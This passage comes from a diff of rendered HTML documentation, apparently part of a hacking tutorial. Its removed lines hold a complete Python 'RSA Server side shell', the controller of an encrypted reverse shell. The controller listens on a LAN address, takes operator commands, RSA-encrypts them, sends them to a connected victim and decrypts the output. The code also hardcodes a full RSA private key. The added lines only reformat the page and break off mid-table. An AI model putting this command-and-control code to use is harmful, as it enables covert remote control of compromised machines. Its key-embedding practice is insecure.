+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19"></a>    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
+</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20"></a>    <span class="nb">print</span> <span class="p">(</span><span class="n">decryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21"></a>
+</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22"></a><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="rsa-server-side-shell">RSA Server side shell</h2>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kn">import</span> <span class="nn">socket</span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="kn">from</span> <span class="nn">Cryptodome.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="kn">from</span> <span class="nn">Cryptodome.Cipher</span> <span class="kn">import</span> <span class="n">PKCS1_OAEP</span>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">):</span>
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>    <span class="n">publickey</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;-----BEGIN PUBLIC KEY-----</span>
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="s1">MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAt9mjsBED9D/MYnU+W5+6</span>
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="s1">aP9SS1vgL9X6bThNkGKsZ5ZVfnoK4BxMBHI5Gi/YtoCJjyAGsWMpxy1fQ+F+ZWVA</span>
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="s1">kwZDoQMWTrfZASHmQgB944PfGA7qfn15kDXmCyvzbitRyWvTs1LDDNF7Q/54Qj82</span>
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="s1">h/85ibOPzQrpwQTjEAs8CJ14YWXAJnqOC6devaDYKdB7SSlueVtoQ8BxWc3hOJHJ</span>
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="s1">pvgZQ/6NixnICLIrFN0YbKZo4A0D3yRJIdumZw8uqwEMeIt41ja6zOG3gKtsG8su</span>
-</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="s1">BZ/MvqX0WgojWr6hNs1Q8h3LtiSsPiUP/bTWD9zos8Yr7RuEabesjHlY0qcNzZ/Y</span>
-</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="s1">gKXdgxUkCikTjRon6Mvh7iWKAtEilQlDeBYMGUvFUQ5FMF5LZJ5Q/7+JXulv8Whq</span>
-</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="s1">KTp4dGpB3kUWuN+ltxBr+IYPhpBfMcR97W+NuXDReUiIGFJpVI1m4AeCzz1BdAM7</span>
-</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="s1">U928DcglK6IowMmN4McyKuv49YYPd7TNFjJWc7P6e19V3BsxA5jpCc6Dxp5AM6WC</span>
-</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="s1">0FqgSSOGVCIkcHT5wLcALyaXOaO0vhMgWWO233Of33wh/7oHclsc5r44MHlZrNSe</span>
-</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="s1">X2QIHCFU4Mwp1hutIuIKkn5dLt1qmt2CDUO/uxGbdTf667c9TLYcYWoi/eDBdrVx</span>
-</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="s1">7CkYI7g81RdcB6jGgbr9W4kCAwEAAQ==</span>
-</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="s1">-----END PUBLIC KEY-----&#39;&#39;&#39;</span>
-</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>    <span class="n">public_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">publickey</span><span class="p">)</span>
-</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>    <span class="n">encryptor</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>
-</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>    <span class="n">encryptedData</span> <span class="o">=</span> <span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
-</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>    <span class="k">return</span> <span class="n">encryptedData</span>
-</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>
-</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">):</span>
-</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>    <span class="n">privatekey</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;-----BEGIN RSA PRIVATE KEY-----</span>
-</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a><span class="s1">MIIJKQIBAAKCAgEApceMHQ9c5Cdf+qgd4ASPM7WNbKavEwat78bMHQVK6cRNm2XS</span>
-</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a><span class="s1">WCLpTsYN2eUALV++dYi2Im0T92bqYojRm+p4vVKOvrdmcmfnITEw/++pbvGZYRf2</span>
-</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a><span class="s1">y0zsSJi1Mi+lfgQs56QXBMIU6IdeCL2C7cex9LNJ98ipGeN6nBiaExI9he3Pcivz</span>
-</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a><span class="s1">tD5vHowCwkbzAnpZgPamrN10/KukWKvJ3t05bc0MskjkhVaaN55eidzAXUmYmxyo</span>
-</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a><span class="s1">Leke1GssiU+TInZQXbSiUeeFsZpkMjYX4nCSxT/TuuFaDy6tfpfM+ePNEgeLjn7W</span>
-</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a><span class="s1">AJh2ApxaYhmqwbDTsXd0ldHc4iNeGmlaEGE9DgXPSp7ljV9SZ7eO9LZuiERz003N</span>
-</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a><span class="s1">rUqSKSHdYgEIH8wZrCiKSP471oNYn0ye+KdV/v25dqTXApO3QO/LZrJQ8twQyASR</span>
-</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a><span class="s1">1LB3tTVYGuNpRVLlNC4j4ivL22uDCbGOIBOaKDmu/QR5imLdjj3alVg69Ci3It3j</span>
-</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a><span class="s1">TlubtHDaXTVs+i1133fOKMnRPLmCHE1/6MMSi1BzDF46Q2XJwjgDnH5rk70n7sVq</span>
-</span><span id="__span-4-36"><a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a><span class="s1">uQtpHZkpQsuSSrjiL9Bi3jYghReVfFHC7aNFp42v7EMaLohpnFm6yKiEm5UacMs7</span>
-</span><span id="__span-4-37"><a id="__codelineno-4-37" name="__codelineno-4-37" href="#__codelineno-4-37"></a><span class="s1">rLdnUQtAKo3r5UiNAegY6h/ZDncGhah1e5wFdBPIb9wJyTjPYTiTJ3rDQGECAwEA</span>
-</span><span id="__span-4-38"><a id="__codelineno-4-38" name="__codelineno-4-38" href="#__codelineno-4-38"></a><span class="s1">AQKCAgAIWpZiboBBVQSepnMe80veELOIOpwO6uK/9vYZLkeYoRZCEu73FwdHu24+</span>
-</span><span id="__span-4-39"><a id="__codelineno-4-39" name="__codelineno-4-39" href="#__codelineno-4-39"></a><span class="s1">QS5xmuYHmTSIZpO/f1WnUnqxjy63Z54e2TIV6Mt6Xja4ZvTUTONsQ59hnkY34E4d</span>
-</span><span id="__span-4-40"><a id="__codelineno-4-40" name="__codelineno-4-40" href="#__codelineno-4-40"></a><span class="s1">Mc52m7JBmAC68ibIku23pgkff1Ul3hUHofp3fgGTNSAqftxPz+yItdNJjW3fDbIj</span>
-</span><span id="__span-4-41"><a id="__codelineno-4-41" name="__codelineno-4-41" href="#__codelineno-4-41"></a><span class="s1">5RxgzxaMi6FZi61WADY/a6S4ENDQiikuIMM3PuZ1kAr2ioO9D7TbeCW3boxpqt7r</span>
-</span><span id="__span-4-42"><a id="__codelineno-4-42" name="__codelineno-4-42" href="#__codelineno-4-42"></a><span class="s1">KnHhJjIljrExTGfty7hp2VT5ya9ztiQuwiVeJ32BqBehrguK8YtkSlrxW71yoztg</span>
-</span><span id="__span-4-43"><a id="__codelineno-4-43" name="__codelineno-4-43" href="#__codelineno-4-43"></a><span class="s1">vydeLFF2m2zqEdG+KYcX8KAjvCqt4ctK2V49q1FplqBuSMODRbucy36FMfEFGRHK</span>
-</span><span id="__span-4-44"><a id="__codelineno-4-44" name="__codelineno-4-44" href="#__codelineno-4-44"></a><span class="s1">Uc6qIWfQcZTuv1fJuq+8hYOYYcAEN/z6usF3KMTz1Qbk2qN01GAf8XcCjm3a56cc</span>
-</span><span id="__span-4-45"><a id="__codelineno-4-45" name="__codelineno-4-45" href="#__codelineno-4-45"></a><span class="s1">nPWZp+1jYoPSvhU4XHiUb8iUqXGloX4NkkxmvFFtRtt/eE/ELypdLRpK8hkMACwI</span>
-</span><span id="__span-4-46"><a id="__codelineno-4-46" name="__codelineno-4-46" href="#__codelineno-4-46"></a><span class="s1">tB4yoTZNm2wKAGC78IyLrgJDO/sBhA9uhWhoAVwX8Baou0HhYt2fvkl4rTR2e2rV</span>
-</span><span id="__span-4-47"><a id="__codelineno-4-47" name="__codelineno-4-47" href="#__codelineno-4-47"></a><span class="s1">QTfwDTiOI5N/ETlFEVDLw2b9mBGtrvjnMVtSM/CztC+cswVu+rFGAYMemXjmBfUM</span>
-</span><span id="__span-4-48"><a id="__codelineno-4-48" name="__codelineno-4-48" href="#__codelineno-4-48"></a><span class="s1">NHkeV2jRvafTvd7bz4Pm5CqOyi3LIxR0gb5YVIx/6bJ67W19+wKCAQEAtcyBmJO5</span>
-</span><span id="__span-4-49"><a id="__codelineno-4-49" name="__codelineno-4-49" href="#__codelineno-4-49"></a><span class="s1">ToWebIU1afPOmkUTlfF8wPDLq3Ww8hn2KLD8AsiN7by3WJePMrnbKxMpBupFa/Rg</span>
-</span><span id="__span-4-50"><a id="__codelineno-4-50" name="__codelineno-4-50" href="#__codelineno-4-50"></a><span class="s1">cRru84De31Y4vaxrxEh3ZiWwmn/sOXUFcDC4FtQGFN/4lNQ4wvb6UPRsYpgNuWWS</span>
-</span><span id="__span-4-51"><a id="__codelineno-4-51" name="__codelineno-4-51" href="#__codelineno-4-51"></a><span class="s1">1Y8UhofeIWbo0fyP9nfB4juUYCGAngPN2gj6iogC33SVaBwqPKMQC4lFHjnfdDoZ</span>
-</span><span id="__span-4-52"><a id="__codelineno-4-52" name="__codelineno-4-52" href="#__codelineno-4-52"></a><span class="s1">6G7NzSFpkslneOnLDrfZTqCiJa9Awjt6u/wpmeTdwnW9VC6abDNOeFzVP3+6/DOU</span>
-</span><span id="__span-4-53"><a id="__codelineno-4-53" name="__codelineno-4-53" href="#__codelineno-4-53"></a><span class="s1">ExXdspWFVpI9QV/uYW6m0wFiC1KBGBAVmXYIZLVHBw0emgPbetlsCpFn7lAHSRlj</span>
-</span><span id="__span-4-54"><a id="__codelineno-4-54" name="__codelineno-4-54" href="#__codelineno-4-54"></a><span class="s1">fwooOP6+YpsYzwKCAQEA6XE8ZXb+sgdvaLnBr8thAUgsHhSlZcMU+idmXPPTgu7/</span>
-</span><span id="__span-4-55"><a id="__codelineno-4-55" name="__codelineno-4-55" href="#__codelineno-4-55"></a><span class="s1">foX6c7czIS73RrrCm9GCIQpv6k6BP/Exi9XMlEhmzQqcFFaKaPJMHRxMlHcgzJIL</span>
-</span><span id="__span-4-56"><a id="__codelineno-4-56" name="__codelineno-4-56" href="#__codelineno-4-56"></a><span class="s1">AE/g5yKUJN0GAMROLv4FFT52pkdlm/HV0rQ+2FEUX/MYla5JggTrOHJoiWNNKUzQ</span>
-</span><span id="__span-4-57"><a id="__codelineno-4-57" name="__codelineno-4-57" href="#__codelineno-4-57"></a><span class="s1">8uH2mQc+dEgzNvd+WhwNkJq5bRZqi2q+wvlj9NlucnEtD7Xcd9IoSNtHS0CfI83F</span>
-</span><span id="__span-4-58"><a id="__codelineno-4-58" name="__codelineno-4-58" href="#__codelineno-4-58"></a><span class="s1">tWCIv5uQfK2cT1A2jcLlZtT7HHWKRpd7w6+jx5t4yhPVGhCb9UIe/nM2Ex2ZTbdE</span>
-</span><span id="__span-4-59"><a id="__codelineno-4-59" name="__codelineno-4-59" href="#__codelineno-4-59"></a><span class="s1">qv7Bs2WF3lm5P/wvcrYbMcnVWo6Qrab0iRpthRz/zwKCAQEAl5IZuovvQ3hDzVaC</span>
-</span><span id="__span-4-60"><a id="__codelineno-4-60" name="__codelineno-4-60" href="#__codelineno-4-60"></a><span class="s1">YgPTjOtqmOjtii84n4tQK4lZojNs6SUsr7lXY5V43mH2SMOAwTMxDgCBJ8u8zWf0</span>
-</span><span id="__span-4-61"><a id="__codelineno-4-61" name="__codelineno-4-61" href="#__codelineno-4-61"></a><span class="s1">aWAJjpnif5OreI6T3zwoRv85uX/k+6NqLp1NM0h8yo//wt8GPm1ng9sbwNG52zAM</span>
-</span><span id="__span-4-62"><a id="__codelineno-4-62" name="__codelineno-4-62" href="#__codelineno-4-62"></a><span class="s1">Eu0pz2ky3dqa23OxETTdduDVD6PMvxMG0ibxKgvRaxzIk9WuurSliNGoKBG5o/zn</span>
-</span><span id="__span-4-63"><a id="__codelineno-4-63" name="__codelineno-4-63" href="#__codelineno-4-63"></a><span class="s1">eGpSyoyhr3O4ycVDawfihg3xFin2xUf7W9WuNDFmri9YjSFY6cgkrYCTRBZG8E2Z</span>
-</span><span id="__span-4-64"><a id="__codelineno-4-64" name="__codelineno-4-64" href="#__codelineno-4-64"></a><span class="s1">DcR/LbI9nR4UGHhetfHjj5xZZcjy1oQM4+QcT2xH4PTFD0qLzDUM3fU87v4Y6uv4</span>
-</span><span id="__span-4-65"><a id="__codelineno-4-65" name="__codelineno-4-65" href="#__codelineno-4-65"></a><span class="s1">711AIQKCAQEAjp9ILxWMdmhkgK88zpKLKaVWjuo+QvX1EwCPYar2RsCOCFcCtT/w</span>
-</span><span id="__span-4-66"><a id="__codelineno-4-66" name="__codelineno-4-66" href="#__codelineno-4-66"></a><span class="s1">VQ3EtcnUrC5MOrONvLFJ9i79/lkZLF8vr4YT5bkZxxSBvCdWAj7mIxX28rHazlwp</span>
-</span><span id="__span-4-67"><a id="__codelineno-4-67" name="__codelineno-4-67" href="#__codelineno-4-67"></a><span class="s1">9nuy9zT4L22y3U/UXbKxOZ1+7cSBwNeIgzaahph9AJrQuyPrCkVJFzp/TmUPrF7o</span>
-</span><span id="__span-4-68"><a id="__codelineno-4-68" name="__codelineno-4-68" href="#__codelineno-4-68"></a><span class="s1">oVKbN7Ht2E/bWcWuFB/l6FfHRIfpseZFvFW5GigaEnqrchfGbwuELvPBHxdjdO0u</span>
-</span><span id="__span-4-69"><a id="__codelineno-4-69" name="__codelineno-4-69" href="#__codelineno-4-69"></a><span class="s1">UX4gSbTQH7w7O6BT6wdE++wBCYV9oq4yFgQX5lzPbACBvyPUnckvqHOX2IDdByW3</span>
-</span><span id="__span-4-70"><a id="__codelineno-4-70" name="__codelineno-4-70" href="#__codelineno-4-70"></a><span class="s1">rClVLOp+cq8f3kNZvoHrkqy2Ki2jS/hzsQKCAQB+A7OrM+7hns9bRKxm/SGChTx3</span>
-</span><span id="__span-4-71"><a id="__codelineno-4-71" name="__codelineno-4-71" href="#__codelineno-4-71"></a><span class="s1">73c2IrGepgN/ra5eXNi/aywvpy+yOrorDcJ3gfTMg4yeVnqA/FcOMWQkpbHbtXAm</span>
-</span><span id="__span-4-72"><a id="__codelineno-4-72" name="__codelineno-4-72" href="#__codelineno-4-72"></a><span class="s1">HDT/tc4t88SR2Z/gzt1ZAIT+dB2N5T0qV91ZTUm5XxIRfHiT/D3rokDzYbnQQKwl</span>
-</span><span id="__span-4-73"><a id="__codelineno-4-73" name="__codelineno-4-73" href="#__codelineno-4-73"></a><span class="s1">yExyM9RINW9wIO19KNxDpS0TbcB0bkpYgn5f+bAvJ7Pe6Xof88DUrhoy3PnYHNYY</span>
-</span><span id="__span-4-74"><a id="__codelineno-4-74" name="__codelineno-4-74" href="#__codelineno-4-74"></a><span class="s1">aH+BJDcZLlE/MpIXXgy+2afo7MkNBTS6jLPihnC447QhWZ2ufp2/dHnwy2XMJcsE</span>
-</span><span id="__span-4-75"><a id="__codelineno-4-75" name="__codelineno-4-75" href="#__codelineno-4-75"></a><span class="s1">76tuOr1FELvtzE3z2BE9OvCJj4Mb3grRMD35Q1Aqd4TAgSF2Okl2EsmR/wf9</span>
-</span><span id="__span-4-76"><a id="__codelineno-4-76" name="__codelineno-4-76" href="#__codelineno-4-76"></a><span class="s1">-----END RSA PRIVATE KEY-----&#39;&#39;&#39;</span>
-</span><span id="__span-4-77"><a id="__codelineno-4-77" name="__codelineno-4-77" href="#__codelineno-4-77"></a>    <span class="n">private_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">privatekey</span><span class="p">)</span>
-</span><span id="__span-4-78"><a id="__codelineno-4-78" name="__codelineno-4-78" href="#__codelineno-4-78"></a>    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
-</span><span id="__span-4-79"><a id="__codelineno-4-79" name="__codelineno-4-79" href="#__codelineno-4-79"></a>    <span class="n">dec</span> <span class="o">=</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span>
-</span><span id="__span-4-80"><a id="__codelineno-4-80" name="__codelineno-4-80" href="#__codelineno-4-80"></a>    <span class="k">return</span> <span class="n">dec</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
-</span><span id="__span-4-81"><a id="__codelineno-4-81" name="__codelineno-4-81" href="#__codelineno-4-81"></a><span class="k">def</span> <span class="nf">connect</span><span class="p">():</span>
-</span><span id="__span-4-82"><a id="__codelineno-4-82" name="__codelineno-4-82" href="#__codelineno-4-82"></a>    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
-</span><span id="__span-4-83"><a id="__codelineno-4-83" name="__codelineno-4-83" href="#__codelineno-4-83"></a>    <span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;192.168.0.152&#39;</span><span class="p">,</span> <span class="mi">8080</span><span class="p">))</span>
-</span><span id="__span-4-84"><a id="__codelineno-4-84" name="__codelineno-4-84" href="#__codelineno-4-84"></a>    <span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-</span><span id="__span-4-85"><a id="__codelineno-4-85" name="__codelineno-4-85" href="#__codelineno-4-85"></a>    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Listening for incoming TCP connection on port 8080&#39;</span><span class="p">)</span>
-</span><span id="__span-4-86"><a id="__codelineno-4-86" name="__codelineno-4-86" href="#__codelineno-4-86"></a>    <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
-</span><span id="__span-4-87"><a id="__codelineno-4-87" name="__codelineno-4-87" href="#__codelineno-4-87"></a>
-</span><span id="__span-4-88"><a id="__codelineno-4-88" name="__codelineno-4-88" href="#__codelineno-4-88"></a>    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
-</span><span id="__span-4-89"><a id="__codelineno-4-89" name="__codelineno-4-89" href="#__codelineno-4-89"></a>        <span class="n">store</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-</span><span id="__span-4-90"><a id="__codelineno-4-90" name="__codelineno-4-90" href="#__codelineno-4-90"></a>        <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;Shell&gt; &quot;</span><span class="p">)</span>
-</span><span id="__span-4-91"><a id="__codelineno-4-91" name="__codelineno-4-91" href="#__codelineno-4-91"></a>        <span class="k">if</span> <span class="s1">&#39;terminate&#39;</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
-</span><span id="__span-4-92"><a id="__codelineno-4-92" name="__codelineno-4-92" href="#__codelineno-4-92"></a>            <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;terminate&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-</span><span id="__span-4-93"><a id="__codelineno-4-93" name="__codelineno-4-93" href="#__codelineno-4-93"></a>            <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span><span id="__span-4-94"><a id="__codelineno-4-94" name="__codelineno-4-94" href="#__codelineno-4-94"></a>            <span class="k">break</span>
-</span><span id="__span-4-95"><a id="__codelineno-4-95" name="__codelineno-4-95" href="#__codelineno-4-95"></a>        <span class="k">else</span><span class="p">:</span>
-</span><span id="__span-4-96"><a id="__codelineno-4-96" name="__codelineno-4-96" href="#__codelineno-4-96"></a>            <span class="n">command</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">command</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-</span><span id="__span-4-97"><a id="__codelineno-4-97" name="__codelineno-4-97" href="#__codelineno-4-97"></a>            <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
-</span><span id="__span-4-98"><a id="__codelineno-4-98" name="__codelineno-4-98" href="#__codelineno-4-98"></a>            <span class="n">result</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
-</span><span id="__span-4-99"><a id="__codelineno-4-99" name="__codelineno-4-99" href="#__codelineno-4-99"></a>            <span class="k">try</span><span class="p">:</span>
-</span><span id="__span-4-100"><a id="__codelineno-4-100" name="__codelineno-4-100" href="#__codelineno-4-100"></a>                <span class="nb">print</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="n">result</span><span class="p">))</span>
-</span><span id="__span-4-101"><a id="__codelineno-4-101" name="__codelineno-4-101" href="#__codelineno-4-101"></a>            <span class="k">except</span><span class="p">:</span>
-</span><span id="__span-4-102"><a id="__codelineno-4-102" name="__codelineno-4-102" href="#__codelineno-4-102"></a>                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] unable to decrypt/receive data!&quot;</span><span class="p">)</span>
-</span><span id="__span-4-103"><a id="__codelineno-4-103" name="__codelineno-4-103" href="#__codelineno-4-103"></a>
-</span><span id="__span-4-104"><a id="__codelineno-4-104" name="__codelineno-4-104" href="#__codelineno-4-104"></a><span class="n">connect</span><span class="p">()</span>
-</span></code></pre></div>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">  1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">  2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">  3</a></span>
+<span class="normal"><a href="#__codelineno-4-4">  4</a></span>
+<span class="normal"><a href="#__codelineno-4-5">  5</a></span>
+<span class="normal"><a href="#__codelineno-4-6">  6</a></span>
+<span class="normal"><a href="#__codelineno-4-7">  7</a></span>
+<span class="normal"><a href="#__codelineno-4-8">  8</a></span>
+<span class="normal"><a href="#__codelineno-4-9">  9</a></span>
+<span class="normal"><a href="#__codelineno-4-10"> 10</a></span>
+<span class="normal"><a href="#__codelineno-4-11"> 11</a></span>
+<span class="normal"><a href="#__codelineno-4-12"> 12</a></span>
+<span class="normal"><a href="#__codelineno-4-13"> 13</a></span>
+<span class="normal"><a href="#__codelineno-4-14"> 14</a></span>
+<span class="normal"><a href="#__codelineno-4-15"> 15</a></span>
+<span class="normal"><a href="#__codelineno-4-16"> 16</a></span>
+<span class="normal"><a href="#__codelineno-4-17"> 17</a></span>
+<span class="normal"><a href="#__codelineno-4-18"> 18</a></span>
+<span class="normal"><a href="#__codelineno-4-19"> 19</a></span>
+<span class="normal"><a href="#__codelineno-4-20"> 20</a></span>
+<span class="normal"><a href="#__codelineno-4-21"> 21</a></span>
+<span class="normal"><a href="#__codelineno-4-22"> 22</a></span>
+<span class="normal"><a href="#__codelineno-4-23"> 23</a></span>
+<span class="normal"><a href="#__codelineno-4-24"> 24</a></span>
+<span class="normal"><a href="#__codelineno-4-25"> 25</a></span>
+<span class="normal"><a href="#__codelineno-4-26"> 26</a></span>
+<span class="normal"><a href="#__codelineno-4-27"> 27</a></span>
+<span class="normal"><a href="#__codelineno-4-28"> 28</a></span>
+<span class="normal"><a href="#__codelineno-4-29"> 29</a></span>
+<span class="normal"><a href="#__codelineno-4-30"> 30</a></span>
+<span class="normal"><a href="#__codelineno-4-31"> 31</a></span>
+<span class="normal"><a href="#__codelineno-4-32"> 32</a></span>
+<span class="normal"><a href="#__codelineno-4-33"> 33</a></span>
+<span class="normal"><a href="#__codelineno-4-34"> 34</a></span>
+<span class="normal"><a href="#__codelineno-4-35"> 35</a></span>
+<span class="normal"><a href="#__codelineno-4-36"> 36</a></span>
+<span class="normal"><a href="#__codelineno-4-37"> 37</a></span>
+<span class="normal"><a href="#__codelineno-4-38"> 38</a></span>
+<span class="normal"><a href="#__codelineno-4-39"> 39</a></span>
+<span class="normal"><a href="#__codelineno-4-40"> 40</a></span>
+<span class="normal"><a href="#__codelineno-4-41"> 41</a></span>
+<span class="normal"><a href="#__codelineno-4-42"> 42</a></span>
+<span class="normal"><a href="#__codelineno-4-43"> 43</a></span>
+<span class="normal"><a href="#__codelineno-4-44"> 44</a></span>
+<span class="normal"><a href="#__codelineno-4-45"> 45</a></span>
+<span class="normal"><a href="#__codelineno-4-46"> 46</a></span>
+<span class="normal"><a href="#__codelineno-4-47"> 47</a></span>
+<span class="normal"><a href="#__codelineno-4-48"> 48</a></span>
+<span class="normal"><a href="#__codelineno-4-49"> 49</a></span>
+<span class="normal"><a href="#__codelineno-4-50"> 50</a></span>
+<span class="normal"><a href="#__codelineno-4-51"> 51</a></span>
+<span class="normal"><a href="#__codelineno-4-52"> 52</a></span>
+<span class="normal"><a href="#__codelineno-4-53"> 53</a></span>
+<span class="normal"><a href="#__codelineno-4-54"> 54</a></span>
+<span class="normal"><a href="#__codelineno-4-55"> 55</a></span>
+<span class="normal"><a href="#__codelineno-4-56"> 56</a></span>
+<span class="normal"><a href="#__codelineno-4-57"> 57</a></span>
+<span class="normal"><a href="#__codelineno-4-58"> 58</a></span>
+<span class="normal"><a href="#__codelineno-4-59"> 59</a></span>
+<span class="normal"><a href="#__codelineno-4-60"> 60</a></span>
+<span class="normal"><a href="#__codelineno-4-61"> 61</a></span>
+<span class="normal"><a href="#__codelineno-4-62"> 62</a></span>
+<span class="normal"><a href="#__codelineno-4-63"> 63</a></span>
+<span class="normal"><a href="#__codelineno-4-64"> 64</a></span>
+<span class="normal"><a href="#__codelineno-4-65"> 65</a></span>
